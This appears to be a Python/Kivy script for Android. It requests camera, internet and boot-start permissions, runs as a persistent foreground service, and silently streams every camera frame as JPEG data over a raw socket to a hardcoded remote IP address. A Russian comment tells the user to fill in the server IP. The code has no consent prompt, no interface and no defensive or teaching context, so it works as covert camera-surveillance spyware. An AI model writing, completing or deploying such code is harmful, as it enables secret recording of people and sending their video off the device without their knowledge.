import socket
import cv2
import numpy as np
from kivy.utils import platform

if platform == 'android':
    from android.permissions import request_permissions, Permission
    from android.service import Service

    request_permissions([Permission.CAMERA, Permission.INTERNET, Permission.FOREGROUND_SERVICE, Permission.RECEIVE_BOOT_COMPLETED])

    service = Service('camera_stream', foreground=True)
    service.start()

def stream_video():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('178.95.15.120', 12345))  # Укажи IP сервера

    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        _, buffer = cv2.imencode('.jpg', frame)
        client_socket.sendall(buffer.tobytes())

    cap.release()
    client_socket.close()

stream_video()

